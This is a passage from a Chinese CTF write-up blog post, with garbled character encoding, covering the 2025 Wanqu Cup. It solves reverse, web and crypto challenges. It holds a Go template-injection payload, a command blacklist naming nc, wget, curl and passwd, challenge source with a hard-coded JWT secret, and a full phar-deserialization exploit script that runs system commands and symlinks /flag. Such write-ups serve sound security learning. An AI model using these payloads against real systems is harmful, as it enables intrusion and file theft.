[{"categories":["CTF"],"content":"å‰è¨€ å·®ä¸å¤šsoloæ‰“äº†ä¸€å¤©ï¼Œä¸Šåˆä¸Šä¸å»å¹³å°ï¼Œä¸‹åˆåˆšåˆšå¥½æ²¡è¯¾ ","date":"2025-09-10","objectID":"/2025dawanqu/:1:0","tags":["crypto"],"title":"2025æ¹¾åŒºæ¯éƒ¨åˆ†é¢˜è§£å’Œå¤ç°","uri":"/2025dawanqu/"},{"categories":["CTF"],"content":"hardtest idaå¯åŠ¨ï¼Œç®—æ³•æµç¨‹æ˜¯ï¼šè¾“å…¥å­—ç¬¦ -\u003e å¼‚æˆ–0x5A -\u003e å¾ªç¯å·¦ç§»3ä½ -\u003e ç‰¹æ®Šå˜æ¢ -\u003e æ¨¡å¹‚è¿ç®— -\u003e å¾ªç¯å³ç§»2ä½ -\u003e S-boxæŸ¥è¡¨ã€‚ exp.py sbox = [ 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 ] target = [ 0x97, 0xd5, 0x60, 0x43, 0xb4, 0x10, 0x43, 0x73, 0x0f, 0xda, 0x43, 0xcd, 0xd3, 0xe8, 0x73, 0x4a, 0x94, 0xc3, 0xcd, 0x71, 0xbd, 0xdc, 0x97, 0x1a ] def rol(val, shift): val \u0026= 0xFF return ((val \u003c\u003c shift) | (val \u003e\u003e (8 - shift))) \u0026 0xFF def ror(val, shift): val \u0026= 0xFF return ((val \u003e\u003e shift) | (val \u003c\u003c (8 - shift))) \u0026 0xFF def mod_pow(base, exp, mod): if base == 0: return 0 result = 1 base = base % mod while exp \u003e 0: if exp \u0026 1: result = (result * base) % mod exp \u003e\u003e= 1 base = (base * base) % mod return result def extended_gcd(a, b): if a == 0: return b, 0, 1 gcd, x1, y1 = extended_gcd(b % a, a) x = y1 - (b // a) * x1 y = x1 return gcd, x, y def mod_inverse(a, m): if a == 0: return 0 gcd, x, y = extended_gcd(a, m) if gcd != 1: return None return (x % m + m) % m def encrypt_char(c, pos): val = rol(ord(c), (pos % 7) + 1) val = val ^ 0x5A val = rol(val, 3) high_nibble = (val \u003e\u003e 4) \u0026 0xF low_nibble = val \u0026 0xF transformed = ((16 * ((3 * high_nibble) \u0026 0xF)) | ((5 * low_nibble) \u0026 0xF)) \u0026 0xFF mod_result = mod_pow(transformed, 255, 257) shifted = ror(mod_result, 2) return sbox[shifted] def decrypt_char(encrypted_val, pos): try: shifted = sbox.index(encrypted_val) except ValueError: return None mod_result = rol(shifted, 2) transformed = mod_inverse(mod_result, 257) if transformed is None: return None for high in range(16): for low in range(16): test_val = ((16 * ((3 * high) \u0026 0xF)) | ((5 * low) \u0026 0xF)) \u0026 0xFF if test_val == transformed: original_val = (high \u003c\u003c 4) | low val = ror(original_val, 3) char_val = val ^ 0x5A char_val = ror(char_val, (pos % 7) + 1) if 32 \u003c= char_val \u003c= 126: return chr(char_val) return None def brute_force_char(target_val, pos): for c in range(32, 127): # å¯æ‰“å°ASCIIå­—ç¬¦ char = chr(c) if encrypt_char(char, pos) == target_val: return char return None def solve_flag(): flag = \"\" for i, encrypted_byte in enumerate(target): decrypted_char = decrypt_char(encrypted_byte, i) if not decrypted_char: decrypted_char = brute_force_char(encrypted_byte, i) if decrypted_char: flag += decrypted_char print(f\"ä½ç½® {i}: 0x{encrypted_byte:02x} -\u003e '{decrypted_char}'\") else: print(f\"ä½ç½® {i}: 0x{encrypted_byte:02x} -\u003e è§£å¯†å¤±è´¥\") flag += \"?\" for i, c in enumerate(flag): if c != \"?\": encrypted = encrypt_char(c, i) expected = target[i] status = \"âœ“\" if encrypted == expected else \"âœ—\" print(f\"'{c}' -\u003e 0x{encrypted:02x} (æœŸæœ›: 0x{expected:02x})","date":"2025-09-10","objectID":"/2025dawanqu/:2:0","tags":["crypto"],"title":"2025æ¹¾åŒºæ¯éƒ¨åˆ†é¢˜è§£å’Œå¤ç°","uri":"/2025dawanqu/"},{"categories":["CTF"],"content":"ssti goçš„ssti. {{.}}å›æ˜¾map[B64Decode:0x6ee380 exec:0x6ee120]ï¼Œå‰é¢æ²¡å­¦è¿‡è¿™ç©æ„ï¼Œç°å­¦ä¸€ä¸‹ï¼Œæœ‰é»‘åå•ï¼Œå¯ä»¥baseç»•è¿‡ï¼Œä¹Ÿå¯ä»¥æ›´åŠ ç›´æ¥ä¸€ç‚¹{{exec \"tac /??a?\"}}. é¢˜ç›®æºç  package main import ( \"bytes\" \"encoding/base64\" \"fmt\" \"log\" \"net/http\" \"os/exec\" \"regexp\" \"runtime\" \"strings\" \"text/template\" ) func execCommand(command string) string { var cmd *exec.Cmd if runtime.GOOS == \"windows\" { cmd = exec.Command(\"cmd\", \"/c\", command) } else { cmd = exec.Command(\"bash\", \"-c\", command) } var out bytes.Buffer var stderr bytes.Buffer cmd.Stdout = \u0026out cmd.Stderr = \u0026stderr err := cmd.Run() if err != nil { if stderr.Len() \u003e 0 { return fmt.Sprintf(\"å‘½ä»¤æ‰§è¡Œé”™è¯¯: %s\", stderr.String()) } return fmt.Sprintf(\"æ‰§è¡Œå¤±è´¥: %v\", err) } return out.String() } func b64Decode(encoded string) string { decodedBytes, err := base64.StdEncoding.DecodeString(encoded) if err != nil { return \"error\" } return string(decodedBytes) } func aWAF(next http.Handler) http.Handler { return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { if r.URL.Path != \"/api\" { next.ServeHTTP(w, r) return } query := r.URL.Query().Get(\"template\") if query == \"\" { next.ServeHTTP(w, r) return } blacklist := []string{\"ls\", \"whoami\", \"cat\", \"uname\", \"nc\", \"flag\", \"etc\", \"passwd\", \"\\\\*\", \"pwd\", \"rm\", \"cp\", \"mv\", \"chmod\", \"chown\", \"wget\", \"curl\", \"bash\", \"sh\", \"python\", \"perl\", \"ruby\", \"system\", \"eval\", \"less\", \"more\", \"find\", \"grep\", \"awk\", \"sed\", \"tar\", \"zip\", \"unzip\", \"gzip\", \"gunzip\", \"bzip2\", \"bunzip2\", \"xz\", \"unxz\", \"docker\", \"kubectl\", \"git\", \"svn\", \"f\", \"l\", \"g\", \",\", \"\\\\?\", \"\u0026\u0026\", \"\\\\|\", \";\", \"`\", \"\\\"\", \"\u003e\", \"\u003c\", \":\", \"=\", \"\\\\(\", \"\\\\)\", \"%\", \"\\\\\\\\\", \"\\\\^\", \"\\\\$\", \"!\", \"@\", \"#\", \"\u0026\"} escaped := make([]string, len(blacklist)) for i, item := range blacklist { escaped[i] = \"\\\\b\" + item + \"\\\\b\" } wafRegex := regexp.MustCompile(fmt.Sprintf(\"(?i)%s\", strings.Join(escaped, \"|\"))) if wafRegex.MatchString(query) { // log.Printf(\"æ‹¦æˆªè¯·æ±‚: %s\", wafRegex.FindAllString(query, -1)) http.Error(w, query, 200) return } next.ServeHTTP(w, r) }) } func apiHandler(w http.ResponseWriter, r *http.Request) { query := r.URL.Query().Get(\"template\") if query == \"\" { http.Error(w, \"éœ€è¦templateå‚æ•°\", http.StatusBadRequest) return } funcMap := template.FuncMap{ \"exec\": execCommand, \"B64Decode\": b64Decode, } tmpl, err := template.New(\"api\").Funcs(funcMap).Parse(query) if err != nil { http.Error(w, query, http.StatusAccepted) return } var buf bytes.Buffer if err := tmpl.Execute(\u0026buf, funcMap); err != nil { http.Error(w, query, http.StatusAccepted) return } w.Write(buf.Bytes()) } func rootHandler(w http.ResponseWriter, r *http.Request) { if r.URL.Path != \"/\" { http.NotFound(w, r) return } http.ServeFile(w, r, \"index.html\") } func main() { mux := http.NewServeMux() mux.HandleFunc(\"/\", rootHandler) mux.HandleFunc(\"/api\", apiHandler) log.Println(\"æœåŠ¡å™¨å¯åŠ¨åœ¨ :80\") log.Fatal(http.ListenAndServe(\":80\", aWAF(mux))) } ","date":"2025-09-10","objectID":"/2025dawanqu/:3:0","tags":["crypto"],"title":"2025æ¹¾åŒºæ¯éƒ¨åˆ†é¢˜è§£å’Œå¤ç°","uri":"/2025dawanqu/"},{"categories":["CTF"],"content":"checkwebshell å»è¿½è¸ªæµé‡å¯ä»¥çœ‹è§ä¸€ä¸ªsm4 \u003c?php class SM4 { const ENCRYPT = 1; private $sk; private static $FK = [0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC]; private static $CK = [ 0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269, 0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9, 0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249, 0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9, 0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229, 0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299, 0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209, 0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279 ]; private static $SboxTable = [ 0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05, 0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62, 0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6, 0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8, 0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35, 0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x0D, 0x2D, 0xEC, 0x84, 0x9B, 0x1E, 0x87, 0xE0, 0x3E, 0xB5, 0x66, 0x48, 0x02, 0x6C, 0xBB, 0xBB, 0x32, 0x83, 0x27, 0x9E, 0x01, 0x8D, 0x53, 0x9B, 0x64, 0x7B, 0x6B, 0x6A, 0x6C, 0xEC, 0xBB, 0xC4, 0x94, 0x3B, 0x0C, 0x76, 0xD2, 0x09, 0xAA, 0x16, 0x15, 0x3D, 0x2D, 0x0A, 0xFD, 0xE4, 0xB7, 0x37, 0x63, 0x28, 0xDD, 0x7C, 0xEA, 0x97, 0x8C, 0x6D, 0xC7, 0xF2, 0x3E, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x36, 0x24, 0x07, 0x82, 0xFA, 0x54, 0x5B, 0x40, 0x8F, 0xED, 0x1F, 0xDA, 0x93, 0x80, 0xF9, 0x61, 0x1C, 0x70, 0xC3, 0x85, 0x95, 0xA9, 0x79, 0x08, 0x46, 0x29, 0x02, 0x3B, 0x4D, 0x83, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x1A, 0x47, 0x5C, 0x0D, 0xEA, 0x9E, 0xCB, 0x55, 0x20, 0x15, 0x8A, 0x9A, 0xCB, 0x43, 0x0C, 0xF0, 0x0B, 0x40, 0x58, 0x00, 0x8F, 0xEB, 0xBE, 0x3D, 0xC2, 0x9F, 0x51, 0xFA, 0x13, 0x3B, 0x0D, 0x90, 0x5B, 0x6E, 0x45, 0x59, 0x33 ]; public function __construct($key) { $this-\u003esetKey($key); } public function setKey($key) { if (strlen($key) != 16) { throw new Exception(\"SM4\"); } $key = $this-\u003estrToIntArray($key); $k = array_merge($key, [0, 0, 0, 0]); for ($i = 0; $i \u003c 4; $i++) { $k[$i] ^= self::$FK[$i]; } for ($i = 0; $i \u003c 32; $i++) { $k[$i + 4] = $k[$i] ^ $this-\u003eCKF($k[$i + 1], $k[$i + 2], $k[$i + 3], self::$CK[$i]); $this-\u003esk[$i] = $k[$i + 4]; } } public function encrypt($plaintext) { $len = strlen($plaintext); $padding = 16 - ($len % 16); $plaintext .= str_repeat(chr($padding), $padding); $ciphertext = ''; for ($i = 0; $i \u003c strlen($plaintext); $i += 16) { $block = substr($plaintext, $i, 16); $ciphertext .= $this-\u003ecryptBlock($block, self::ENCRYPT); } return $ciphertext; } private function cryptBlock($block, $mode) { $x = $this-\u003estrToIntArray($block); for ($i = 0; $i \u003c 32; $i++) { $roundKey = $this-\u003esk[$i]; $x[4] = $x[0] ^ $this-\u003eF($x[1], $x[2], $x[3], $roundKey); array_shift($x); } $x = array_reverse($x); return $this-\u003eintArrayToStr($x); } private function F($x1, $x2, $x3, $rk) { return $this-\u003eT($x1 ^ $x2 ^ $x3 ^ $rk); } private function CKF($a, $b, $c, $ck) { return $a ^ $this-\u003eT($b ^ $c ^ $ck); } private function T($x) { return $this-\u003eL($this-\u003eS($x)); } private function S($x) { $result = 0; for ($i = 0; $i \u003c 4; $i++) { $byte = ($x \u003e\u003e (24 - $i * 8)) \u0026 0xFF; $result |= self::$SboxTable[$byte] \u003c\u003c (24 - $i * 8); } return $result; } private function L($x) { return $x ^ $this-\u003erotl($x, 2) ^ $this-\u003erotl($x, 10) ^ $this-\u003erotl($x, 18) ^ $this-\u003erotl($x, 24); } private function rotl($x, $n) { return (($x \u003c\u003c $n) \u0026 0xFFFFFFFF) | (($x \u003e\u003e (32 - $n)) \u0026 0xFFFFFFFF); } private function strToIntArray($str) { $result = []; for ($i = 0; $i \u003c 4; $i++) { $offset = $i * 4; $result[$i] = (ord($str[$offset]) \u003c\u003c 24) | (ord($str[$offset + 1]) \u003c\u003c 16) | (ord($str[$offset + 2]) \u003c\u003c 8) | ord($str[$off","date":"2025-09-10","objectID":"/2025dawanqu/:4:0","tags":["crypto"],"title":"2025æ¹¾åŒºæ¯éƒ¨åˆ†é¢˜è§£å’Œå¤ç°","uri":"/2025dawanqu/"},{"categories":["CTF"],"content":"ez_python å…ˆæ–‡ä»¶ä¼ ä¸€ä¸ªå‘—ï¼Œå‘ç°æ— æƒé™ï¼Œf12å‘ç°æ˜¯jwtï¼Œçˆ†ç ´ä¸¤ä½ä¼ªé€ æˆåŠŸï¼Œç„¶åä¼ pyï¼Œå‘ç°æ˜¯æ²™ç®±é€ƒé€¸ï¼Œè¿™é‡Œç›´æ¥æ–œä½“ç»•è¿‡ï¼Œæ‹¿åˆ°flagã€‚ é¢˜ç›®æºç  from flask import Flask, request, jsonify, render_template_string import jwt import asyncio import yaml import os app = Flask(__name__) JWT_SECRET = \"@o70xO$0%#qR9#m0\" JWT_ALGO = \"HS256\" FORBIDDEN = ['__', 'import', 'os', 'eval', 'exec', 'open', 'read', 'write', 'system', 'subprocess', 'communicate', 'Popen', 'decode', \"\\\\\"] HTML_PAGE = ''' \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eVault\u003c/title\u003e \u003cstyle\u003e body { font-family: \"Segoe UI\", sans-serif; background-color: #f4f4f4; padding: 40px; text-align: center; } #user-info { margin-bottom: 40px; font-weight: bold; font-size: 18px; color: #333; } #sandbox-container { margin-top: 30px; } select, input, button { font-size: 16px; margin: 10px; padding: 8px; border-radius: 6px; border: 1px solid #ccc; } #result { background: #222; color: #0f0; padding: 15px; width: 80%; margin: 20px auto; white-space: pre-wrap; border-radius: 8px; text-align: left; } button { background-color: #4CAF50; color: white; border: none; cursor: pointer; } button:hover { background-color: #45a049; } input[type=\"file\"] { display: block; margin: 10px auto; } \u003c/style\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv id=\"user-info\"\u003eLoading user info...\u003c/div\u003e \u003cdiv id=\"sandbox-container\"\u003e \u003cselect id=\"mode\"\u003e \u003coption value=\"yaml\" selected\u003eYAML\u003c/option\u003e \u003coption value=\"python\"\u003ePython\u003c/option\u003e \u003c/select\u003e \u003cbr\u003e \u003cinput type=\"file\" id=\"codefile\"\u003e \u003cbr\u003e \u003cbutton onclick=\"runCode()\"\u003eâ–¶ Execute from File\u003c/button\u003e \u003cpre id=\"result\"\u003eWaiting for output...\u003c/pre\u003e \u003c/div\u003e \u003cscript\u003e let token = \"\"; fetch(\"/auth\") .then(res =\u003e res.json()) .then(data =\u003e { token = data.token; const payload = JSON.parse(atob(token.split('.')[1])); document.getElementById(\"user-info\").innerHTML = \"\u003cspan style='color:#444'\u003eğŸ‘¤ \" + payload.username + \"\u003c/span\u003e | \" + \"\u003cspan style='color:#4CAF50'\u003eRole: \" + payload.role + \"\u003c/span\u003e\"; }); function runCode() { const fileInput = document.getElementById('codefile'); const mode = document.getElementById(\"mode\").value; if (fileInput.files.length === 0) { document.getElementById(\"result\").textContent = '{\"error\": \"Please select a file to upload.\"}'; return; } const file = fileInput.files[0]; const formData = new FormData(); formData.append('codefile', file); formData.append('mode', mode); fetch(\"/sandbox\", { method: \"POST\", headers: { \"Authorization\": \"Bearer \" + token }, body: formData }) .then(res =\u003e res.json()) .then(data =\u003e { document.getElementById(\"result\").textContent = JSON.stringify(data, null, 2); }); } \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ''' @app.route('/') def index(): return render_template_string(HTML_PAGE) @app.route('/auth') def auth(): token = jwt.encode({'username': 'guest', 'role': 'user'}, JWT_SECRET, algorithm=JWT_ALGO) if isinstance(token, bytes): token = token.decode() return jsonify({'token': token}) def is_code_safe(code: str) -\u003e bool: return not any(word in code for word in FORBIDDEN) @app.route('/sandbox', methods=['POST']) def sandbox(): auth_header = request.headers.get('Authorization', '') if not auth_header.startswith('Bearer '): return jsonify({'error': 'Invalid token format'}), 401 token = auth_header.replace('Bearer ', '') if 'codefile' not in request.files: return jsonify({'error': 'No file part in the request'}), 400 file = request.files['codefile'] if file.filename == '': return jsonify({'error': 'No file selected'}), 400 mode = request.form.get('mode', 'python') try: code = file.read().decode('utf-8') except Exception as e: return jsonify({'error': f'Could not read or decode file: {e}'}), 400 if not all([token, code, mode]): return jsonify({'error': 'Token, code, or mode is empty'}), 400 try: payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGO]) except Exception as e: partial_key = JWT_SECRET[:-2] return { 'error': 'JWT Decode Failed. Key Hint', 'hint': f'Key starts with \"{partial_key}**\". The 2 missing chars are alphanumeric (letters and numbers).' }, 500 if payload.get('role') != 'admin': return {'error': 'Permission Denied: admin only'}, 403 if","date":"2025-09-10","objectID":"/2025dawanqu/:5:0","tags":["crypto"],"title":"2025æ¹¾åŒºæ¯éƒ¨åˆ†é¢˜è§£å’Œå¤ç°","uri":"/2025dawanqu/"},{"categories":["CTF"],"content":"easy_readfile(èµ›å) çœ‹åŒ…ç¥åšå®¢è¯´DeadsecCTF2025ç±»ä¼¼ï¼Œåé¢çœ‹çœ‹ï¼Œå…ˆå­˜ä¸ªè„šæœ¬ï¼ˆï¼‰ import http.client import urllib.parse import gzip import re import time import socket def _post(url, body, headers=None, timeout=None): u = urllib.parse.urlsplit(url) host = u.hostname port = u.port or (80 if u.scheme == 'http' else 443) path = u.path or '/' if u.query: path += '?' + u.query conn = http.client.HTTPConnection(host, port, timeout=timeout) try: conn.request(\"POST\", path, body=body, headers=headers or {'Content-Type':'application/x-www-form-urlencoded'}) resp = conn.getresponse() data = resp.read().decode('utf-8', 'ignore') return data finally: conn.close() def write(url): with open('phar.phar', 'rb') as f: raw = f.read() gz = gzip.compress(raw) v0 = urllib.parse.quote_from_bytes(gz) body = '1=' + 'O:7:\"Acheron\":1:{s:4:\"mode\";s:1:\"w\";}' + '\u00260=' + v0 r = _post(url, body, {'Content-Type':'application/x-www-form-urlencoded'}) m = re.search(r'/tmp/[0-9a-f]{32}\\.phar', r) if not m: return None return m.group(0) def read(url, phar_path): v0 = urllib.parse.quote(phar_path, safe='') body = '1=' + 'O:7:\"Acheron\":1:{s:4:\"mode\";s:1:\"r\";}' + '\u00260=' + v0 r = _post(url, body, {'Content-Type':'application/x-www-form-urlencoded'}) m = re.search(r'flag', r) return m.group(0) if m else None def runtime_exec(url, phar_path, cmd): v0 = urllib.parse.quote(phar_path, safe='') v2 = urllib.parse.quote(cmd, safe='') body = '1=' + 'O:7:\"Acheron\":1:{s:4:\"mode\";s:1:\"r\";}' + '\u00260=' + v0 + '\u00262=' + v2 r = _post(url + \"?1=system($_POST[2]);\", body, {'Content-Type':'application/x-www-form-urlencoded'}) return r def getflag(url, phar_path): r1 = runtime_exec(url, phar_path,\"pwd\") m1 = re.search(r'/var/www/html', r1) if m1 : print(\"[+] å‘½ä¸­æ ‡è®°ï¼Œå¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥\") runtime_exec(url, phar_path, \"touch -- -H\") print(\"æˆåŠŸåˆ›å»ºè¦†ç›–é¡¹\") time.sleep(1) runtime_exec(url, phar_path, \"ln -s /flag flag\") print(\"æˆåŠŸåˆ›å»ºè½¯è¿æ¥\") time.sleep(15) r2 = runtime_exec(url, phar_path, \"cat backup/flag\") m2 = re.search(r'flag\\{[^}\\r\\n]+\\}', r2, re.I) if m2: return m2.group(0) else : print(\"[-] æœªå‘½ä¸­æ ‡è®°ï¼Œé€€å‡ºæˆ–é‡è¯•\") if __name__ == '__main__': url = \"\" phar_path = write(url) if phar_path: time.sleep(1) print(read(url, phar_path)) time.sleep(1) flag=getflag(url, phar_path) print(flag) ","date":"2025-09-10","objectID":"/2025dawanqu/:6:0","tags":["crypto"],"title":"2025æ¹¾åŒºæ¯éƒ¨åˆ†é¢˜è§£å’Œå¤ç°","uri":"/2025dawanqu/"},{"categories":["CTF"],"content":"new_trick task.py from Crypto.Cipher import AES from Crypto.Util.Padding import pad from secrets import flag, secret assert secret \u003c 2 ** 50 p = 115792089237316195423570985008687907853269984665640564039457584007913129639747 Q_components = (123456789, 987654321, 135792468, 864297531) class Quaternion: def __init__(self, a, b, c, d): self.p = p self.a = a % self.p self.b = b % self.p self.c = c % self.p self.d = d % self.p def __repr__(self): return f\"Q({self.a}, {self.b}, {self.c}, {self.d})\" def __mul__(self, other): a1, b1, c1, d1 = self.a, self.b, self.c, self.d a2, b2, c2, d2 = other.a, other.b, other.c, other.d a_new = a1 * a2 - b1 * b2 - c1 * c2 - d1 * d2 b_new = a1 * b2 + b1 * a2 + c1 * d2 - d1 * c2 c_new = a1 * c2 - b1 * d2 + c1 * a2 + d1 * b2 d_new = a1 * d2 + b1 * c2 - c1 * b2 + d1 * a2 return Quaternion(a_new, b_new, c_new, d_new) def power(base_quat, exp): res = Quaternion(1, 0, 0, 0) base = base_quat while exp \u003e 0: if exp % 2 == 1: res = res * base base = base * base exp //= 2 return res Q = Quaternion(*Q_components) R = power(Q,secret) print(\"--- Public Parameters ---\") print(f\"p = {p}\") print(f\"Q = {Q}\") print(f\"R = {R}\") ''' --- Public Parameters --- p = Q = Q() R = Q() ''' key = md5(str(secret).encode()).hexdigest().encode() cipher = AES.new(key=key,mode=AES.MODE_ECB) print(cipher.encrypt(pad(flag,16))) æœ¬æ¥ä»¥ä¸ºè¦æœ‰ä»€ä¹ˆå››å…ƒæ•°çš„æŠ€å·§å»æ±‚dlpï¼Œåé¢çœ‹ä»–ä»¬å‡ºçš„é‚£ä¹ˆå¿«æˆ‘ä¹Ÿç»·ä¸ä½äº†ï¼Œå¥½åƒå°±2**50çš„èŒƒå›´å·¦å³ï¼Œbsgså°±å¯ä»¥æ‰“ from hashlib import md5 from Crypto.Cipher import AES from Crypto.Util.Padding import unpad def solve(): p = Q_components = () R_components = () ciphertext = b'' a, b, c, d = Q_components norm_Q = (a*a + b*b + c*c + d*d) % p a, b, c, d = R_components norm_R = (a*a + b*b + c*c + d*d) % p bound = 2**50 def bsgs(base, result, modulus, bound): if not bound: bound = modulus m = int(bound**0.5) + 1 baby_steps = {} val = 1 for j in range(m): if j % 1000000 == 0: print(f\" ... baby step {j}/{m}\") baby_steps[val] = j val = (val * base) % modulus try: giant_step_factor = pow(base, -m, modulus) except ValueError: return None val = result for i in range(m): if i % 1000000 == 0: print(f\" ... giant step {i}/{m}\") if val in baby_steps: j = baby_steps[val] x = i * m + j if pow(base, x, modulus) == result: return x val = (val * giant_step_factor) % modulus return None secret = bsgs(norm_Q, norm_R, p, bound) if secret is None: print(\"æœªèƒ½æ‰¾åˆ° secretã€‚BSGS ç®—æ³•å¤±è´¥ã€‚\") return print(f\"æˆåŠŸæ‰¾åˆ° secret: {secret}\") # 3. ä½¿ç”¨ secret è§£å¯† flag # key æ˜¯ secret çš„ md5 å“ˆå¸Œ key = md5(str(secret).encode()).hexdigest().encode() cipher = AES.new(key=key, mode=AES.MODE_ECB) try: # è§£å¯†å¹¶å»é™¤ padding decrypted_data = cipher.decrypt(ciphertext) flag = unpad(decrypted_data, 16) print(f\"ğŸ‰ æˆåŠŸè§£å¯†ï¼Flag: {flag.decode()}\") except (ValueError, KeyError) as e: print(f\"è§£å¯†å¤±è´¥ã€‚secret å¯èƒ½ä¸æ­£ç¡®ã€‚é”™è¯¯: {e}\") print(f\"è§£å¯†åçš„æ•°æ® (raw): {decrypted_data}\") if __name__ == '__main__': solve() ","date":"2025-09-10","objectID":"/2025dawanqu/:7:0","tags":["crypto"],"title":"2025æ¹¾åŒºæ¯éƒ¨åˆ†é¢˜è§£å’Œå¤ç°","uri":"/2025dawanqu/"},{"categories":["CTF"],"content":"someinterersa(èµ›åéé¢„æœŸ) nssctf4thçš„iqqtä¸ä¹‹ä¸€æ ·ï¼Œè¿™ä¸‹çŸ¥é“ä¸ºä»€ä¹ˆä¸æ”¾wpäº†ã€‚ ä¸ä¹‹ä¸åŒçš„æ˜¯nssé‚£ä¸ªåªæœ‰ä¸€ç»„æ•°æ®ï¼Œè¿™ç©æ„çš„ç†è®ºä¸Šæ— ä¸Šé™ï¼Œä¸”åŠ å¯†æ–¹å¼å¾ˆæ™®é€šï¼Œé‚£æˆ‘æ”¶é›†åˆ°è¶³å¤Ÿå¤šçš„ncå¯¹æ˜¯å¯ä»¥æ‰“crtçš„ã€‚ ç†è®ºå­˜åœ¨ï¼Œå®è·µå¼€å§‹ã€‚ å…ˆå­˜ä¸ªå‡ ä¸‡å¯¹ from sage.all import * from pwn import * def work(b): ls = b.decode().strip().split('\\n') N = Integer(int(ls[0].split(' ')[-1])) c = Integer(int(ls[3].split(' ')[-1])) return N, c file = open(\"temp.txt\", \"a\") while True: cs = [remote('pwn-ed184decc2.challenge.xctf.org.cn', 9999, ssl=True) for _ in range(128)] r = [work(conn.recvall()) for conn in cs] for conn in cs: conn.close() print(str(r), file=file) file.flush() èµ›æ—¶å­˜äº†å‡ 